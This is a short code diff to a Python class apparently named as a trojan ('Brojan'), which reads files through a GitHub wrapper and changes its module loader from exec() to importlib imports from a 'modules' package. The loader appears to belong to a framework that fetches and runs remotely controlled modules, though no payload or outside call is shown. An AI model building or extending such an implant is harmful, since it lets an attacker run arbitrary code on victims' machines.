@@ -3,6 +3,7 @@ import base64
 import sys
 import time
 import random
+import importlib
 import threading
 import queue
 import os
@@ -49,10 +50,12 @@ class Brojan():
         return self.github.getFileContents(filePath)
 
     def loadModules(self, config):
-        for module in config.modules:
+        for module in config['modules']:
             if module not in sys.modules:
-                print("Loading module " + module)
-                exec(module)
+                print("Loading module '%s' " % module)
+                newModule = importlib.import_module('modules.%s' % module)
+                sys.modules[module] = newModule
+                print(sys.modules)
 
         self.configured =  True
 
